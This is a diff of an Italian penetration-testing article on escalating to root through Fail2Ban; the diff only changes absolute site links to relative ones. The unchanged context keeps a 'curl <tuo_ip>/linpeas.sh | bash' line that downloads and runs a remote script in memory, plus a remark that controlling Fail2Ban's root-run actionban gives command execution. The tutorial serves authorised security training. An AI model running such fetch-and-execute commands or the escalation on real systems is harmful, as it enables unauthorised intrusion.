@@ -109,7 +109,7 @@ Quello che vuoi vedere:
 
 ## Enumerazione Automatica con LinPEAS e LSE
 
-[LinPEAS](https://hackita.it/articoli/linpeas/) identifica automaticamente i vettori Fail2Ban. Eseguilo in memoria:
+[LinPEAS](/articoli/linpeas/) identifica automaticamente i vettori Fail2Ban. Eseguilo in memoria:
 
 ```bash
 curl <tuo_ip>/linpeas.sh | bash
@@ -123,7 +123,7 @@ Cerca nell'output:
 
 > LinPEAS può non rilevare la versione e i jail configurati — integra sempre con verifica manuale.
 
-In alternativa usa [LSE](https://hackita.it/articoli/lse/) con livello 2 per un output ordinato per severità.
+In alternativa usa [LSE](/articoli/lse/) con livello 2 per un output ordinato per severità.
 
 ***
 
@@ -239,6 +239,6 @@ Fail2Ban esegue `actionban` come root ad ogni ban. Se controlli `actionban`, con
 
 Uso esclusivo in ambienti autorizzati.
 
-Se questo articolo ti è stato utile e vuoi supportare HackIta, puoi farlo qui: [hackita.it/supporto](https://hackita.it/supporto)
+Se questo articolo ti è stato utile e vuoi supportare HackIta, puoi farlo qui: [hackita.it/supporto](/supporto)
 
-Se vuoi fare sul serio — formazione 1:1, lab guidati o far testare la tua azienda — trovi tutto qui: [hackita.it/servizi](https://hackita.it/servizi)
+Se vuoi fare sul serio — formazione 1:1, lab guidati o far testare la tua azienda — trovi tutto qui: [hackita.it/servizi](/servizi)
